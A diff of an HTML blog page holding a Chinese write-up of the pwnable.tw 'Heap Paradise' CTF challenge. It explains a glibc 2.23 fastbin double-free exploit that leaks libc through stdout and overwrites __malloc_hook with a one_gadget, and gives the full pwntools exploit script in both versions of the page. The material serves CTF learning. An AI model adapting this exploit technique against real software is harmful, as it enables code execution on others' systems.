@@ -1,77 +1,75 @@
-<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>PWNABLE.TW-Heap Paradise-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做"><meta property="og:image" content><meta property="og:title" content="PWNABLE.TW-Heap Paradise-WP"><meta property="og:description" content="第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1214.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-23T23:00:00+00:00"><meta property="article:modified_time" content="2021-03-23T23:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PWNABLE.TW-Heap Paradise-WP"><meta name=twitter:description content="第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做"><script src=https://www.cjovi.icu/js/feather.min.js></script>
-<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.bfb8dec0e2220d86f104bd8230dbf2c35b583e46ccfef90bb620854db94ef7a5.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
-<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>PWNABLE.TW-Heap Paradise-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做"><meta property="og:image" content><meta property="og:title" content="PWNABLE.TW-Heap Paradise-WP"><meta property="og:description" content="第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1214.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-23T23:00:00+00:00"><meta property="article:modified_time" content="2021-03-23T23:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PWNABLE.TW-Heap Paradise-WP"><meta name=twitter:description content="第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
 <a href=/posts.html>All posts</a>
 <a href=/about.html>About</a>
-<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>PWNABLE.TW-Heap Paradise-WP</h1><div class=meta>Posted on Mar 23, 2021</div></div><section class=body><p>第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/1990905493.png></div><p>又是如此，只有分配和回收，保护全开。和昨天做的 <a href=https://www.cjovi.icu/WP/1210.html>Re-alloc Revenge</a> 很像，不过此题 libc 版本为 2.23，难度陡增。</p><p><code>free</code> 中未对指针置零，存在 <code>double free</code>，意味着可以比较容易地通过 <code>fastbin double free</code> 实现任意地址写。那么难点就在 leak 上了。没什么思路，面向 WP 解题后了解到，其实有 <code>double free</code> 就是可以构造出一个大小足够的 chunk 的。这其实和 <code>tache struct attack</code> 很像，昨天刚刚学的知识今天没有用上，想想也是很遗憾，融会贯通的能力还是不够。</p><p>考虑到 <code>fastbin</code> 的 <code>fd</code> 是指向下一个堆块的，类似于 <code>arbitrary alloc</code> 的，覆写 <code>fd</code> 的一个字节，使之指向一个真实的 chunk 的上部，这样就可以修改那个真实的 chunk 的 <code>size</code> 域了，如果我们事先伪造好，使修改过 <code>size</code> 后该 chunk 仍合法，再 free 这个 chunk 就可以获得一个 <code>unsorted bin</code> 了，之后的 <code>_IO_FILE</code> 攻击和劫持 <code>__malloc_hook</code> 就是老方法了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span># coding=utf-8
-</span></span><span style=display:flex><span>from pwn import *
-</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;,&#34;splitw&#34;,&#34;-h&#34;]
-</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>PWNABLE.TW-Heap Paradise-WP</h1><div class=meta>Posted on Mar 23, 2021</div></div><section class=body><p>第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/1990905493.png></div><p>又是如此，只有分配和回收，保护全开。和昨天做的 <a href=https://www.cjovi.icu/WP/1210.html>Re-alloc Revenge</a> 很像，不过此题 libc 版本为 2.23，难度陡增。</p><p><code>free</code> 中未对指针置零，存在 <code>double free</code>，意味着可以比较容易地通过 <code>fastbin double free</code> 实现任意地址写。那么难点就在 leak 上了。没什么思路，面向 WP 解题后了解到，其实有 <code>double free</code> 就是可以构造出一个大小足够的 chunk 的。这其实和 <code>tache struct attack</code> 很像，昨天刚刚学的知识今天没有用上，想想也是很遗憾，融会贯通的能力还是不够。</p><p>考虑到 <code>fastbin</code> 的 <code>fd</code> 是指向下一个堆块的，类似于 <code>arbitrary alloc</code> 的，覆写 <code>fd</code> 的一个字节，使之指向一个真实的 chunk 的上部，这样就可以修改那个真实的 chunk 的 <code>size</code> 域了，如果我们事先伪造好，使修改过 <code>size</code> 后该 chunk 仍合法，再 free 这个 chunk 就可以获得一个 <code>unsorted bin</code> 了，之后的 <code>_IO_FILE</code> 攻击和劫持 <code>__malloc_hook</code> 就是老方法了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#34;splitw&#34;</span>,<span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#sh = process(&#34;./heap_paradise&#34;)
-</span></span><span style=display:flex><span>sh = remote(&#34;chall.pwnable.tw&#34;,10308)
-</span></span><span style=display:flex><span>libc = ELF(&#34;./libc_64.so.6&#34;)
-</span></span><span style=display:flex><span>#libc = ELF(&#34;/glibc/2.23/amd64/lib/libc.so.6&#34;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./heap_paradise&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;chall.pwnable.tw&#34;</span>,<span style=color:#40a070>10308</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc_64.so.6&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc = ELF(&#34;/glibc/2.23/amd64/lib/libc.so.6&#34;)</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def alloc(size,payload):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Choice:&#34;,str(1))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Size :&#34;,str(size))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;Data :&#34;,payload)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>alloc</span>(size,payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice:&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size :&#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Data :&#34;</span>,payload)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def free(index):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Choice:&#34;,str(2))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Index :&#34;,str(index))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>free</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice:&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>2</span>))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index :&#34;</span>,<span style=color:#007020>str</span>(index))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\n&#39;) #0
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\x00&#39; * 0x40 + p64(0xA0) + p64(0x21)) #1
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#0</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0xA0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>)) <span style=color:#60a0b0;font-style:italic>#1</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>free(0)
-</span></span><span style=display:flex><span>free(1)
-</span></span><span style=display:flex><span>free(0)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>0</span>)
 </span></span><span style=display:flex><span>  
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\x20&#39;) #2
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\n&#39;) #3 pass
-</span></span><span style=display:flex><span>alloc(0x68,p64(0) * 2 + p64(0) + p64(0x71)) #4 pass
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\x00&#39;) #5 now we have this ptr point to heap_base + 0x20
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x20</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#2</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#3 pass</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x71</span>)) <span style=color:#60a0b0;font-style:italic>#4 pass</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#5 now we have this ptr point to heap_base + 0x20</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>free(0)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>0</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>alloc(0x68,p64(0) + p64(0) + p64(0) + p64(0xA1)) #6 this chunk is in fact the chunk 0 
-</span></span><span style=display:flex><span>free(5)
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0xA1</span>)) <span style=color:#60a0b0;font-style:italic>#6 this chunk is in fact the chunk 0 </span>
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>5</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>&#39;&#39;&#39;after the work above we got the address of main_arena + 88&#39;&#39;&#39;
+</span></span><span style=display:flex><span><span style=color:#4070a0>&#39;&#39;&#39;after the work above we got the address of main_arena + 88&#39;&#39;&#39;</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>free(0)
-</span></span><span style=display:flex><span>free(1)
-</span></span><span style=display:flex><span>alloc(0x78,&#39;\x00&#39; * 0x40 + p64(0) + p64(0x71) + &#39;\xa0&#39;) #7 chunk 0
-</span></span><span style=display:flex><span>free(7)
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\x00&#39; * 0x20 + p64(0) + p64(0x71) + p64(libc.symbols[&#34;_IO_2_1_stdout_&#34;] - 0x43)[:2]) #8
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\n&#39;) #9
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\x00&#39; * 0x33 + p64(0xfbad1887) + p64(0) * 3 + &#39;\x88&#39;) #10
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x78</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x71</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xa0</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#7 chunk 0</span>
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>7</span>)
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x71</span>) <span style=color:#666>+</span> p64(libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x43</span>)[:<span style=color:#40a070>2</span>]) <span style=color:#60a0b0;font-style:italic>#8</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#9</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x33</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0xfbad1887</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x88</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#10</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>_IO_2_1_stdin_addr = u64(sh.recv(8))
-</span></span><span style=display:flex><span>libc_base = _IO_2_1_stdin_addr - libc.symbols[&#34;_IO_2_1_stdin_&#34;]
-</span></span><span style=display:flex><span>log.success(&#34;libc_base:&#34; + hex(libc_base))
-</span></span><span style=display:flex><span>__malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]
-</span></span><span style=display:flex><span>one_gadget = libc_base + 0xef6c4
+</span></span><span style=display:flex><span>_IO_2_1_stdin_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> _IO_2_1_stdin_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;_IO_2_1_stdin_&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> hex(libc_base))
+</span></span><span style=display:flex><span>__malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xef6c4</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>free(0)
-</span></span><span style=display:flex><span>free(1)
-</span></span><span style=display:flex><span>free(0)
-</span></span><span style=display:flex><span>alloc(0x68,p64(__malloc_hook - 0x23)) #11
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\n&#39;) #12
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\n&#39;) #13
-</span></span><span style=display:flex><span>alloc(0x68,&#39;\x00&#39; * 0x13 + p64(one_gadget)) #14
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>free(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,p64(__malloc_hook <span style=color:#666>-</span> <span style=color:#40a070>0x23</span>)) <span style=color:#60a0b0;font-style:italic>#11</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#12</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#13</span>
+</span></span><span style=display:flex><span>alloc(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x13</span> <span style=color:#666>+</span> p64(one_gadget)) <span style=color:#60a0b0;font-style:italic>#14</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Choice:&#34;,str(1))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Size :&#34;,str(1))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice:&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size :&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.interactive()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
 </span></span></code></pre></div><p>同时本题对堆块申请的数量限制非常严格，要注意最后分配到 <code>__malloc_hook</code> 的时候可以直接对开始申请的几个 chunk 进行 <code>free</code>，不需要重复申请（我蠢到先 free 在申请会在再 <code>double free</code>，就超出次数了）</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
 <a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
 <a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
 <a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
-<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
+<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
